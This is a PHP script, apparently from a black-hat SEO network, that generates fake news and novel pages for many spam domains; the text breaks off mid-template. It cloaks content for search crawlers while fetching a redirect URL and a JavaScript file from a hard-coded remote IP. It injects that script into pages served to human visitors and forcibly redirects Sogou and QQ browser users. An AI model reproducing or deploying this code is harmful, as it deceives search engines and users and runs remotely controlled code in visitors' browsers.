<?php
	error_reporting(0); 
	//error_reporting(E_ALL); 
	$currUrl = str_replace('//', '/', $_SERVER['REQUEST_URI']);
	if(preg_match('#^.*(\.css|\.js|\.gif|\.png|\.jpg|\.jpeg|\.ico)(\?.*)?$#i', $currUrl)){
		header('HTTP/1.1 404 Not Found'); 
		exit();
	}
	
	header('HTTP/1.1 200 OK'); 
	header("Content-type: text/html; charset=utf-8");
	header("Cache-Control: no-transform");//禁止百度转码
	
	define('ROOT',__DIR__.'/..');//定义绝对物理路径a
	
	
	include ROOT.'/include/CacheFile.php';//缓存模块
	include ROOT.'/include/CacheRedis.php';//redis数据模块
	include ROOT.'/include/functions.php';//自定义函数
	
	
	//识别 Macintosh 文件的行结束符
	ini_set("auto_detect_line_endings", true);
	
	//Google等垃圾蜘蛛禁止访问
	if(IsUselessSpider()) 
	{
	    header('HTTP/1.1 404 Not Found');  
        exit();
	}
	
	
	//删除对应域名缓存
	if($_GET['method'] == 'clearRedisCache'){
	    clearRedisCache();
	}
	if($_GET['method'] == 'clearLocalCache'){
	    clearLocalCache();
	}
	
	
    //请求协议
    $Protocol = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://':'http://';
	//获取host跟主域名有区别
	$host_name = $_SERVER['HTTP_HOST'];
	//主域名
    $topDomain = getTopDomain();
	//电影录配置文件
	$mydomain_list1 = include $config['domainlist'].'/dyconfig.php';
	//电影泛目录配置文件
	$mydomain_list2 = include $config['domainlist'].'/dy_fml/dy_fml_config.php';
	//小说泛目录配置文件
	$mydomain_list3 = include $config['domainlist'].'/xs_fml/xs_fml_config.php';
	
    $mergeDomain = array_merge($mydomain_list1,$mydomain_list2,$mydomain_list3);
    if(count($mergeDomain) == 0){
        exit('配置文件无数据，请前往配置后再重试！！！');
    }
	
	
	//二级域名前缀
	$secondDomian = getTopDomain(true);
	//是否是首页
	$isPageIndex = false;
	if($secondDomian == "" && ($currUrl == "" || $currUrl == "/")){
	    $isPageIndex = true;
	}
	
    
    $currentDomain = "";
    //获取域名点域名配置信息
    foreach($mergeDomain as $key => $value)
    {
        if($key == "") continue;
        if(strpos($host_name,$key) !== false){
            $WebSiteInfo = $mergeDomain[$key];
            $currentDomain = $key;
            break;
        }
    }
    if($currentDomain == ""){
        exit("站点域名未配置，无法访问！！！");
    } 
    
	
	
	//统计代码
	$baidu_push_js = file_get_contents('https://23.224.153.251:36862/tongji/zhenniu.txt'); 
	//浏览器标识 
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	//获取跳转域名
    $myJumpUrl = file_get_contents('https://23.224.153.251:36862/get_down.txt');
    //获取js跳转代码
    $aliyun_jsfile = file_get_contents('https://23.224.153.251:36862/get_aliyunoss.txt').'?v='.rand(10,999999);
	
	
	$load_page_js = '';
// 	if($WebSiteInfo['fanmulu_jump'] == "ok"){
        if(!$isPageIndex){ //判断首页不跳转
        	if (!IsSpider()) {
                $load_page_js = '<script rel="nofollow" type="text/javascript" src="'.$aliyun_jsfile.'"></script>';
        	}
        	if (!IsSpider() && (stripos($user_agent, 'SogouMobile') !== false|| stripos($user_agent, 'SogouMSE') !== false || stripos($user_agent, 'MQQBrowser') !== false)) { 
                header('refresh: 2;url='.$myJumpUrl.'/'); //搜狗喝QQ浏览器直接跳转
                echo("正在进入，请稍候……");exit();
        	    //$load_page_js = '<meta http-equiv="refresh" content="0;url='.$myJumpUrl.'" />';
               // $load_page_js .= '<script rel="nofollow" type="text/javascript" src="'.$aliyun_jsfile.'"></script>'; 
        	}
        	//360浏览器-QihooBrowser
        	//搜狗浏览器-SogouMSE
        	//UC浏览器-UCBrowser
        	//百度浏览器-baidubrowser
        }
// 	}
    
    
    $youqing_link ='';
	if (IsSpider()) {
    // 	$domain = array_keys($mergeDomain);
    //     shuffle($domain);
    //     $fjx_arr = array("film","movie","video","cinema","horror","comedy","detective","romance","suspense","thriller","documentary","fantasy"
    //     ,"epic","road","crime-ganster","3D-animated","road","black","ghost","war","dance","musical","western","disaster","buddy");
            
    //     foreach ($domain as $dm)
    //     {
    //         $fml = $mergeDomain[$dm]['fanmulu'];
    //         $rd_fml = $fml[mt_rand(0,count($fml)-1)];
    //         $str_fml = explode('/',$rd_fml)[0];
    //         $fjx_str = $fjx_arr[array_rand($fjx_arr,1)];
    //         $youqing_link .='<a href="http://'.$fjx_str.'.'.$dm.'/'.$str_fml.'/'.randStr(mt_rand(6,10),'n').'.html"></a>';
    //     }
    //     $youqing_link = '<div style="display:none;color:#fff;">'.$youqing_link.'</div>';
	}
    
    
    $url_real = '';	
	$url_params = '';
	if(strpos($currUrl, '?') > 0) {
	    $url_params = explode('?', $currUrl)[1];
		$url_real = explode('?', $currUrl)[0];
	}
	else{
	    $url_real = $currUrl;
	}
	$url_real = trim($url_real, '/');
	$url_real_arr = explode('/', $url_real);
	if(count($url_real_arr) > 0){
	    $url_real = '/'.$url_real_arr[count($url_real_arr)-1]; 
	}
	else{
	    $url_real = '/'.$url_real;
	}
	if($url_params != ""){
	    $url_real = $url_real.'?'.$url_params;
	}
    
	
    //当前url 统一转小写，大小写不区分，带与不带最后/一致
	$cachePageKey = rtrim(strtolower($host_name.$currUrl), '/');
    //实例化缓存，读取缓存内容
    $cache_file = new CacheFile();   
    //是否开启缓存 
    $Is_OpenCache = true;
	//获取缓存页面，如果存在就直接输出 
	if($Is_OpenCache){
    	if ($html = $cache_file -> get($cachePageKey, false, $currentDomain)) {
    	    
            // //不是蜘蛛不输出body
            // if(!IsSpider()){
            //     $html = preg_replace('/<body([\s\S]*?)<\/body>/i', "<body></body>", $html);
            // }
            
            //站长验证代码
            $html = site_vcode($WebSiteInfo['baidu-site-vcode'], $html);
            
	        if($Protocol == "https://"){
	            $html = str_replace('http://'.$host_name, 'https://'.$host_name, $html);
    	        $html = str_replace('http://'.$topDomain, 'https://'.$topDomain, $html);
    	        $html = str_replace('http://m.'.$topDomain, 'https://m.'.$topDomain, $html);
    	        $html = str_replace('http://www.'.$topDomain, 'https://www.'.$topDomain, $html);
    	    }
            
	        $html = str_replace('</head>', $load_page_js.'</head>', $html);
	        $html = str_replace('</body>', $baidu_push_js.'</body>', $html);
	        
	        if ($config['compress']){
                exit(mac_compress_html($youqing_link.$html));
            } else{
        	    exit($youqing_link.$html);
            }
    	}
	} 
	
	
	$dy_temp_v20 = array('v201', 'v202', 'v204', 'v205', 'v208', 'v211', 'v212', 'v213', 'v214', 'v215', 'v301', 'v302', '303');
	//正规电源泛目录模板
    $dy_temp_1 = array('temp10', 'temp11', 'temp12', 'temp13', 'temp14');
    $dy_temp_2 = array('temp20', 'temp21', 'temp22', 'temp23');
    $dy_temp_3 = array('temp30', 'temp31', 'temp32', 'temp33');
    $dy_temp_4 = array('temp_dy_221103', 'temp_dy_221111', 'temp_fml_1', 'temp_fml_2', 'temp_fml_mip');
    $dy_temp_5 = array('temp70');
    $dy_temp_6 = array('temp120', 'temp130');
    //纯小说泛目录模板
    $xs_temp_3 = array('temp_xs', 'temp_xs_11', 'temp_xs_12'); 
	
	
	//最新百度科普模板 
	if($WebSiteInfo['tpl'] == "temp_bdkp"){
        $tpl = file_get_contents(ROOT.'/tpl/temp_bdkp/temp.html'); 
    	//是否显示图片
    	$isShowImg = false;

        $newsContent = '{#新的干扰标签}';
        $strArr = [
            '<span>{#句子}{#句子}{#句子}{#句子}{#句子}</span>',
            '<span>{#句子}{#句子}{#句子}{#句子}{#句子}{#句子}{#句子}{#句子}{#句子}</span>',
            '<strong>{#句子}{#句子}{#句子}</strong>',
            '<strong>{#句子}{#句子}{#句子}{#句子}{#句子}</strong>',
            '<span style="color: #B83232;--tt-darkmode-color: #B83232">{#句子}{#句子}{#句子}</span>',
            '<span style="color: #B83232;--tt-darkmode-color: #B83232">{#句子}{#句子}{#句子}{#句子}{#句子}</span>',
            '<strong><span style="color: #B83232;--tt-darkmode-color: #B83232">{#句子}{#句子}</span></strong>',
            '<strong><span style="color: #B83232;--tt-darkmode-color: #B83232">{#句子}{#句子}{#句子}{#句子}</span></strong>',
            '<strong><span style="color: #B83232;--tt-darkmode-color: #B83232"><span style="background-color: #FFD05E;--tt-darkmode-bgcolor: #E8BD55">{#句子}{#句子}</span></span></strong>',
            '<strong><span style="color: #B83232;--tt-darkmode-color: #B83232"><span style="background-color: #FFD05E;--tt-darkmode-bgcolor: #E8BD55">{#句子}{#句子}{#句子}{#句子}</span></span></strong>'
            ];
        $newsContentArr = [
            '<div class="_3ygOc lg-fl "><p><p>[#替换标签]</p></p></div>',
            '<div class="_213jB lg-fl "><p><p>[#替换标签]</p></p></div>'
        ];
        $forNum = rand(8,20);
        for($i=1; $i<=$forNum; $i++){
            $contentStr = $newsContentArr[array_rand($newsContentArr,1)];
            $contentStr = str_replace('[#替换标签]', $strArr[array_rand($strArr,1)], $contentStr);
            $randImgNum = rand(1,10);
            if($randImgNum%7==0 || $isShowImg){
                $contentStr = '<!--<div class="_213jB lg-fl "><div class="JmmC0"><img src="{#当前域名}/{#本地美女图片}" class="_1mscr"></div></div>-->';
            }
            $newsContent .= $contentStr;
        }
        
        $newsContent .= '<div class="_213jB lg-fl "><div class="JmmC0">本报记者 {#作者} 【编辑:{#作者} 】</div></div>';
		$tpl = str_replace('{#newsContent}', $newsContent, $tpl);
		
		
        $newsList = '{#新的干扰标签}';
        //随机二级域名
        $startFlag = ['android','iphone','web','*','wap','mulu','down','*','app','news','flag','*','category','list','post','*'];
        //读取新闻标题数据
    	$newstitleArr = getDataArr("data", "newstitle");
        for($i=1; $i<=3; $i++){
            $news_id = '22news_{#sz20}';
            $newstitle = $newstitleArr[array_rand($newstitleArr,1)];
            
            $myDomain = '';
            if(count(explode('.', $secondDomian)) <= 2){
                $fanjiexi = $startFlag[array_rand($startFlag,1)];
                if($fanjiexi == "*"){
                    $fanjiexi = randStr(rand(4,7),'l');
                }
                $myDomain = $Protocol.$fanjiexi.'.'.getTopDomain();
            }
            
            $newsList .= '<div class="YcICc">';
                if($isShowImg){
        			$newsList .= '<a target="_blank" href="'.$myDomain.'/newspage/data/landingsuper?context=%7B%22nid%22%3A%'.$news_id.'%22%7D&amp;n_type=1&amp;p_from=3" class="_1fOl1">
        				<img src="{#当前域名}/{#本地美女图片}" />
        			</a>';
                }
    			$newsList .= '<div class="_3WMY7">
    				<a target="_blank" href="'.$myDomain.'/newspage/data/landingsuper?context=%7B%22nid%22%3A%'.$news_id.'%22%7D&amp;n_type=1&amp;p_from=3">
    					<h3 class="_1t2-a" title="'.unicode_encode($newstitle).'">'.unicode_encode($newstitle).'
    					</h3>
    				</a>
    				<div class="_310KP">
    					<span class="_2E-qC">{#随机数1位}小时前</span><span class="_2YSoS">{#随机数2-4位}阅读</span>
    				</div>
    			</div>
    		</div>';
        }
		$tpl = str_replace('{#newsList}', $newsList, $tpl);
		
		
    	$aboutNews = '{#新的干扰标签}';
        for($i=1; $i<=5; $i++){
            $news_id = '22news_{#sz20}';
            $newstitle = $newstitleArr[array_rand($newstitleArr,1)];
            
            $myDomain = '';
            if(count(explode('.', $secondDomian)) <= 2){
                $fanjiexi = $startFlag[array_rand($startFlag,1)];
                if($fanjiexi == "*"){
                    $fanjiexi = randStr(rand(4,7),'l');
                }
                $myDomain = $Protocol.$fanjiexi.'.'.getTopDomain();
            }
            
    		$aboutNews .= '<div class="_1VoUW">';
    		    if($isShowImg){
        			$aboutNews .= '<a target="_blank" href="'.$myDomain.'/newspage/data/landingsuper?context=%7B%22nid%22%3A%'.$news_id.'%22%7D&amp;n_type=1&amp;p_from=4" class="_3DfrL">
    		        <img src="{#当前域名}/{#本地美女图片}" />
    	        </a>';
    		    }
                $aboutNews .= '<div class="K20wW">
    				<a target="_blank"
    					href="'.$myDomain.'/newspage/data/landingsuper?context=%7B%22nid%22%3A%'.$news_id.'%22%7D&amp;n_type=1&amp;p_from=4">
    					<h3 class="_2soHQ" title="'.unicode_encode($newstitle).'">'.unicode_encode($newstitle).'
    					</h3>
    				</a>
    				<div class="_3t94r">
    				    <a target="_blank" href="'.$myDomain.'?from=bjh_article&amp;app_id={#sz16}" class="_1uond">{#导演}</a>
    				    <a target="_blank"href="'.$myDomain.'/newspage/data/landingsuper?context=%7B%22nid%22%3A%'.$news_id.'%22%7D&amp;n_type=1&amp;p_from=4"><span class="_3IV0P">{#随机数2-4位}评论</span></a>
    				</div>
    			</div>
    		</div>';
        }
		$tpl = str_replace('{#aboutNews}', $aboutNews, $tpl); 
		
		
		$hotNews = '{#新的干扰标签}';
        for($i=1; $i<=10; $i++){
            $newstitle = $newstitleArr[array_rand($newstitleArr,1)];
            
            $myDomain = '';
            if(count(explode('.', $secondDomian)) <= 2){
                $fanjiexi = $startFlag[array_rand($startFlag,1)];
                if($fanjiexi == "*"){
                    $fanjiexi = randStr(rand(4,7),'l');
                }
                $myDomain = $Protocol.$fanjiexi.'.'.getTopDomain();
            }
            
    		$hotNews .= '<ul class="_1lLRC">
    			<li class="_12b-N">
    				<span class="_3dw0l">'.$i.'</span>
    				<a target="_blank" href="'.$myDomain.'?id={#zf16}&amp;sa=fyb_news_feedpc&amp;rsv_dl=fyb_news_feedpc&amp;from=feedpc" class="_20SVc">
    					<span class="_3OBs2" title="'.unicode_encode($newstitle).'">'.unicode_encode($newstitle).'</span>
    				</a>
    			</li>
    		</ul>';
        }
		$tpl = str_replace('{#hotNews}', $hotNews, $tpl);
		
		
		$mytt1 = ['腾讯网','搜狐网','搜狗','知乎','网易','哔哩哔哩','百度百科','微博','凤凰网','抖音','头条']; 
        $mytt2 = ['2023','全方面'];
        $mytt3 = [' ','.','/','-'];
        $titleStr = unicode_encode("给大家科普一下")."{#对应关键词}".unicode_encode("(".$mytt2[array_rand($mytt2,1)]."已更新(今日".$mytt3[array_rand($mytt3,1)].$mytt1[array_rand($mytt1,1)].")");
        $tpl = str_replace('{#百度科普标题}', $titleStr, $tpl);
	}
	//最新小说模板
	else if($WebSiteInfo['tpl'] == "temp_xs_12"){
	    $xsm_data_Arr = getDataArr("data", "xiaoshuo");
	    $xs_status_Arr = ['连载', '完结'];
	    $bookRoute = ['/book.html', '/chapter.html', '/chapterlist.html', '/rank.html', '/shelf.html', '/category.html', '/categorylist.html','/bookfree.html'];
	    
	    
	    $tpl = "";
        for($i=0; $i<count($bookRoute); $i++)
        {
            if(substr_count($currUrl,$bookRoute[$i])){
                $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].$bookRoute[$i]);
                break;
            }
        }
        if($tpl == ""){
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/book.html');
        }
	    
	    if($isPageIndex){
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
            //编辑力荐
            $tuijian = "";
            for($i=1; $i<=3; $i++){
                $bookid = rand(100000,9999999);
                $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                
                $tuijian .= '<a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
    				<div class="home-book-item flex border-b touch-a" data-bookid="'.$bookid.'">
    					<div class="book-img-border">{#随机N个标签}
					    <img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border"></div>
    					<div class="book-info-sc flex--fluid">
    						<h3 class="font-a">'.$xiaoshuoming.'</h3>
    						<div class="desc">{#句子}</div>
    						<div class="other flex flex--justify">{#随机N个标签}
    							<i class="author flex--fluid"><em class="author-icon"></em>{#作者}</i>
    							<i class="item-label">{#小说类}</i>
    							<i class="item-state">'.$xs_status.'</i>
    						</div>
    					</div>
    				</div>
				</a>';
            }
            $tpl = str_replace('{#编辑力荐}', $tuijian, $tpl);
            
            
            //男生必读,女生爱看
            $boy_book_data = '';
            $girl_book_data = '';
            for($i=1; $i<=2; $i++){
                $boy_book_data .= '<div class="home-card-con flex">';
                $girl_book_data .= '<div class="home-card-con flex">';
                for($j=1; $j<=3; $j++){
                    
                    $bookid = rand(100000,9999999);
                    $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $boy_book_data .= '<div class="flex-fluid home-book-box home-book-box-sc touch" data-bookid="'.$bookid.'">
                				    <a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">{#随机N个标签}
                    					<img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border">
                    					<i class="book-name">'.$xiaoshuoming.'</i>
                					</a>
                				</div>';

                    
                	$bookid = rand(100000,9999999);
    				$xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $girl_book_data .= '<div class="flex-fluid home-book-box home-book-box-sc touch" data-bookid="'.$bookid.'">{#随机N个标签}
                				    <a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                    					<img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border">
                    					<i class="book-name">'.$xiaoshuoming.'</i>
                					</a>
                				</div>';
				
                }
                $boy_book_data .= '</div>';
                $girl_book_data .= '</div>';
            }
            $tpl = str_replace('{#男生必读}', $boy_book_data, $tpl);
            $tpl = str_replace('{#女生爱看}', $girl_book_data, $tpl);
            
            
            //分类推荐
            $list_book_data = '';
            $list_book_Arr = ['玄幻仙侠', '都市娱乐', '科幻历史', '热门推荐'];
            for($i=0; $i<count($list_book_Arr); $i++){
                $bookid = rand(100000,9999999);
                $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                $list_book_data .= '<!--'.$list_book_Arr[$i].'begin-->{#随机N个标签}';
                $list_book_data .= '<div class="home-card" alt="'.$list_book_Arr[$i].'">
                            			<div class="home-card-title flex">
                            				<i class="home-icon-tit home-icon-tit-a"></i>{#随机N个标签}
                            				<i class="flex--fluid">'.$list_book_Arr[$i].'</i>
                            			</div>
                            			<a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                                			<div class="home-book-item flex border-b touch" data-bookid="'.$bookid.'">
                                				<div class="book-img-border"><img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border"></div>
                                				<div class="book-info-sc flex--fluid">{#随机N个标签}
                                					<h3 class="font-a">'.$xiaoshuoming.'</h3>
                                					<div class="desc">{#句子}</div>
                                					<div class="other flex flex--justify">
                                						<i class="author flex--fluid"><em class="author-icon"></em>{#作者}</i>
                                						<i class="item-label">{#小说类}</i>{#随机N个标签}
                                						<i class="item-state">'.$xs_status.'</i>
                                					</div>
                                				</div>
                            			    </div>
                            			</a>';
                for($j=1; $j<=4; $j++){
                    
                    $bookid = rand(100000,9999999);
                    $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $list_book_data .= '<a class="home-row-line flex touch-a border-b" data-bookid="'.$bookid.'"
                            				href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">{#随机N个标签}
                            				<span class="flex--fluid">[{#小说类}]'.$xiaoshuoming.'：{#章节}</span>
                            				<i class="home-icon-arrow home-row-link"></i>
                            			</a>';
				
                }
                $list_book_data .= '</div>';
                $list_book_data .= '<!--'.$list_book_Arr[$i].'end-->';
            }
            $tpl = str_replace('{#分类小说数据}', $list_book_data, $tpl);
            
            
            //完本经典,新书精选
            $wbjd_book_data = '';
            $xsjx_book_data = '';
            for($i=1; $i<=2; $i++){
                $wbjd_book_data .= '<div class="home-card-con flex">{#随机N个标签}';
                $xsjx_book_data .= '<div class="home-card-con flex">{#随机N个标签}';
                for($j=1; $j<=3; $j++){
                    
                    $bookid = rand(100000,9999999);
                    $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $wbjd_book_data .= '<div class="flex-fluid home-book-box home-book-box-sc touch" data-bookid="'.$bookid.'">
                				    <a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                    					<img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border">{#随机N个标签}
                    					<i class="book-name">'.$xiaoshuoming.'</i>
                					</a>
                				</div>';

                    
                	$bookid = rand(100000,9999999);
    				$xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $xsjx_book_data .= '<div class="flex-fluid home-book-box home-book-box-sc touch" data-bookid="'.$bookid.'">
                				    <a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">{#随机N个标签}
                    					<img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border">
                    					<i class="book-name">'.$xiaoshuoming.'</i>
                					</a>
                				</div>';
				
                }
                $wbjd_book_data .= '</div>';
                $xsjx_book_data .= '</div>';
            }
            $tpl = str_replace('{#完本经典}', $wbjd_book_data, $tpl);
            $tpl = str_replace('{#新书精选}', $xsjx_book_data, $tpl);
	    }
	    else if(substr_count($currUrl,'rank.html')){
            $book_rank_data = '';
            $list_book_Arr = ['百度小说月票榜', '男生热门榜', '女生热门榜', '潜力新书榜', '完本精品榜'];
            for($i=0; $i<count($list_book_Arr); $i++){
                $book_rank_data .= '<!--'.$list_book_Arr[$i].'begin-->{#随机N个标签}';
                $book_rank_data .= '<h3 class="cat_tit"><em></em>'.$list_book_Arr[$i].'<a href="/h5/rank?type='.($i+1).'" class="top_more"><em></em>查看榜单</a></h3>';
                $book_rank_data .= '<div class="top_list">';
                
                $readNum = rand(300000,999999);
                for($j=1; $j<=5; $j++){
                    $bookid = rand(100000,9999999);
                    $readNum = $readNum - rand(3000,20000);
                    $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $book_rank_data .= '<a href="/h5/book.html?bookid='.$bookid.'&_st={#sz2}_{#sz3}_'.$bookid.'"><em>'.$j.'</em>'.$xiaoshuoming.'<span class="num">'.$readNum.'</span></a>';
                }
                $book_rank_data .= '</div>{#随机N个标签}';
                $book_rank_data .= '<!--'.$list_book_Arr[$i].'end-->';
            }
            $tpl = str_replace('{#小说排行数据}', $book_rank_data, $tpl);
	    }
	    else if(substr_count($currUrl,'categorylist.html')){
	        $book_list_data = '';
	        
            for($j=1; $j<=12; $j++){
                $bookid = rand(100000,9999999);
                $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                $xs_status_Arr = ['<span>更新至：</span>第'.rand(50,2000).'章：{#章节}', '已完结'];
                $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                
                $book_list_data .= '<a href="/h5/book.html?bookid='.$bookid.'&_st={#sz2}_{#sz3}_'.$bookid.'">
        			<div class="bookbox" bookid="'.$bookid.'">{#随机N个标签}
        				<div class="bookimg"><img src="{#本地小说图片}"></div>
        				<div class="bookinfo">
        					<h4 class="bookname">'.$xiaoshuoming.'</h4>
        					<div class="author">作者：{#作者}</div>
        					<div class="cl0"></div>{#随机N个标签}
        					<div class="update">'.$xs_status.'</div>
        					<div class="intro_line"><span>简介：</span>{#句子}</div>
        				</div>
        			</div>
    			</a>'; 
            }
            $tpl = str_replace('{#小说列表数据}', $book_list_data, $tpl);
	    }
	    else if(substr_count($currUrl,'bookfree.html')){
	        
	        if(substr_count($currUrl,'bookfree.html?id=free')){
	            $tpl = str_replace('{#免费名称}', "免费专区", $tpl);
	        }
	        else{
	            $tpl = str_replace('{#免费名称}', "女频精选", $tpl);
	        }
	        
            //编辑力荐
            $tuijian = "";
            for($i=1; $i<=3; $i++){
                $bookid = rand(100000,9999999);
                $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                
                $tuijian .= '<a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
    				<div class="home-book-item flex border-b touch-a" data-bookid="'.$bookid.'">
    					<div class="book-img-border">{#随机N个标签}
					    <img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border"></div>
    					<div class="book-info-sc flex--fluid">
    						<h3 class="font-a">'.$xiaoshuoming.'</h3>
    						<div class="desc">{#句子}</div>{#随机N个标签}
    						<div class="other flex flex--justify">
    							<i class="author flex--fluid"><em class="author-icon"></em>{#作者}</i>
    							<i class="item-label">{#小说类}</i>{#随机N个标签}
    							<i class="item-state">'.$xs_status.'</i>
    						</div>
    					</div>
    				</div>
				</a>';
            }
            $tpl = str_replace('{#编辑力荐}', $tuijian, $tpl);
	        
	        
            //分类推荐
            $list_book_data = '';
            $list_book_Arr = ['免费品书', '新书速递'];
            for($i=0; $i<count($list_book_Arr); $i++){
                $bookid = rand(100000,9999999);
                $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                $list_book_data .= '<!--'.$list_book_Arr[$i].'begin-->';
                $list_book_data .= '<div class="home-card" alt="'.$list_book_Arr[$i].'">
                            			<div class="home-card-title flex">{#随机N个标签}
                            				<i class="home-icon-tit home-icon-tit-a"></i>
                            				<i class="flex--fluid">'.$list_book_Arr[$i].'</i>
                            			</div>{#随机N个标签}
                            			<a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                                			<div class="home-book-item flex border-b touch" data-bookid="'.$bookid.'">
                                				<div class="book-img-border"><img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border"></div>
                                				<div class="book-info-sc flex--fluid">{#随机N个标签}
                                					<h3 class="font-a">'.$xiaoshuoming.'</h3>
                                					<div class="desc">{#句子}</div>
                                					<div class="other flex flex--justify">
                                						<i class="author flex--fluid"><em class="author-icon"></em>{#作者}</i>
                                						<i class="item-label">{#小说类}</i>{#随机N个标签}
                                						<i class="item-state">'.$xs_status.'</i>
                                					</div>
                                				</div>
                            			    </div>
                            			</a>';
                for($j=1; $j<=4; $j++){
                    
                    $bookid = rand(100000,9999999);
                    $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $list_book_data .= '<a class="home-row-line flex touch-a border-b" data-bookid="'.$bookid.'"
                            				href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                            				<span class="flex--fluid">[{#小说类}]'.$xiaoshuoming.'：{#章节}</span>{#随机N个标签}
                            				<i class="home-icon-arrow home-row-link"></i>
                            			</a>';
				
                }
                $list_book_data .= '</div>';
                $list_book_data .= '<!--'.$list_book_Arr[$i].'end-->';
            }
            $tpl = str_replace('{#分类小说数据}', $list_book_data, $tpl);

            //男生免费,女生免费
            $boy_bookfree_data = '';
            $gril_bookfree_data = '';
            for($i=1; $i<=2; $i++){
                $boy_bookfree_data .= '<div class="home-card-con flex">{#随机N个标签}';
                $gril_bookfree_data .= '<div class="home-card-con flex">{#随机N个标签}';
                for($j=1; $j<=3; $j++){
                    
                    $bookid = rand(100000,9999999);
                    $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $boy_bookfree_data .= '<div class="flex-fluid home-book-box home-book-box-sc touch" data-bookid="'.$bookid.'">
                				    <a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                    					<img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border">{#随机N个标签}
                    					<i class="book-name">'.$xiaoshuoming.'</i>
                					</a>
                				</div>';

                    
                	$bookid = rand(100000,9999999);
    				$xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                    $xs_status = $xs_status_Arr[array_rand($xs_status_Arr,1)];
                    $gril_bookfree_data .= '<div class="flex-fluid home-book-box home-book-box-sc touch" data-bookid="'.$bookid.'">
                				    <a href="/h5/book.html?bookid='.$bookid.'&amp;_st={#sz2}_{#sz3}_'.$bookid.'">
                    					<img src="{#本地小说图片}" alt="'.$xiaoshuoming.'" class="img-border">{#随机N个标签}
                    					<i class="book-name">'.$xiaoshuoming.'</i>
                					</a>
                				</div>';
				
                }
                $boy_bookfree_data .= '</div>';
                $gril_bookfree_data .= '</div>';
            }
            $tpl = str_replace('{#男生免费}', $boy_bookfree_data, $tpl);
            $tpl = str_replace('{#女生免费}', $gril_bookfree_data, $tpl);
            
	    }
	    else{
	        
    	    $current_bookId = rand(100000,9999999);
    	    $current_chapterId = rand(10000000,99999999);
    	    $zhangjie_num = rand(30,1500);
    	    $zuozheArr = getDataArr("data", "zuozhe");
    	    $current_zuozhe = trim($zuozheArr[array_rand($zuozheArr,1)], PHP_EOL);
    	    $jianjie_Arr = ['{#句子}<br/>','{#句子}{#句子}<br/>','{#句子}{#句子}{#句子}<br/>'];
    	    $tpl = str_replace('{#对应作者}', $current_zuozhe, $tpl);
    	    
    	    $current_bookStr = '<div class="booksite">
    			<div class="bookimg">
    				<img src="{#本地小说图片}" alt="{#对应关键词}">
    			</div>{#随机N个标签}
    			<div class="bookinfo">
    				<h1 class="bookname">{#对应关键词}</h1>
    				<div class="info">
